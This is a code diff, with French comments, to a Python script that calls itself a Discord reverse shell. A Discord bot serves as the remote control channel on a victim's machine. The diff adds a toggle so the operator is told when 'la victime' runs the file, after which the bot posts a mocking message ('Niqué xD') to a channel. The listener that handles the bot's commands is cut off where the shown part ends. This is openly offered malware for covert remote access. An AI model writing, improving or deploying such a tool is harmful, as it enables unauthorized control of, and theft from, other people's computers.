@@ -8,7 +8,12 @@ from discord.ext import commands
 # Reverse Shell Discord 
 
 ton_id = 1234567890
-ton_token_de_bot = "TOKEN"
+ton_token_de_bot = "LE TOKEN DE TON BOT"
+
+
+# Voulez-vous être averti quand la victime éxécute le fichier ?
+
+averti = True
 
 
 # Pour être averti quand la victime éxécute le fichier
@@ -29,14 +34,15 @@ bot = commands.Bot(command_prefix='!', intents=discord.Intents.all())
 
 @bot.event
 async def on_ready():
-    for guild in bot.guilds:
-        for channel in guild.channels:
-            if channel.id == salon_id:
-                try:
-                    await channel.send("Niqué xD")
-                except:
-                    pass
-                return
+    if averti:
+        for guild in bot.guilds:
+            for channel in guild.channels:
+                if channel.id == salon_id:
+                    try:
+                        await channel.send("Niqué xD")
+                    except:
+                        pass
+                    return
 
 @bot.listen()
 async def on_message(mess):
